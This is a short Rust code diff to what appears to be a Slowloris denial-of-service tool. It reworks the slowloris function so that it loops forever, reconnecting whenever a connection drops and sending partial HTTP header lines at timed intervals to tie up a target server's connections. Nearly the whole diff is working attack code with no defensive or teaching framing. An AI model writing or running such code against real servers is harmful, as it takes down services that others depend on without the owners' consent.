@@ -61,21 +61,42 @@ fn args_to_attack_opts(args :Arguments) -> Result<AttackOptions, net::AddrParseE
     })
 }
 
-// Kinda pointless for, but turn AttackOptions.target to a proper URL later (it shouldn't contain
-// the port number as it currently does). Make it possible to add custom HTTP headers as well
+// Kinda pointless for now, but turn AttackOptions.target to a proper URL later (it shouldn't
+// contain the port number as it currently does). Make it possible to add custom HTTP headers as
+// well
 fn construct_header(args :&Arguments) -> String {
     format!("GET {} HTTP/1.1\r\nHost: {}\r\n{}", "/", args.arg_target.as_str(), "")
 }
 
 
-fn slowloris(opts :AttackOptions) -> io::Result<()> {
-    let mut stream = try!(net::TcpStream::connect(opts.target));
-    try!(stream.write_all(opts.header.as_str().as_bytes()));
+fn slowloris(opts :AttackOptions) -> ! {
+    'connection: loop {
+        match net::TcpStream::connect(opts.target) {
+            Ok(mut stream) => {
+                match stream.write_all(opts.header.as_str().as_bytes()) {
+                    Ok(_) => {
+                    'attack: loop {
+                        let hdr = format!("{}\r\n", opts.attack_header.as_str());
+                        match stream.write_all(hdr.as_bytes()) {
+                            Ok(_) => {
+                                sleep(opts.interval);
+                            },
+                            Err(_) => {
+                                continue 'connection;
+                            }
+                        }
+                    }
+                    },
+                    Err(_) => {
+                        continue
+                    }
+                }
+            },
+            Err(_) => {
+                continue
+            }
 
-    loop {
-        let hdr = format!("{}\r\n", opts.attack_header.as_str());
-        try!(stream.write_all(hdr.as_bytes()));
-        sleep(opts.interval)
+        }
     }
 }
 
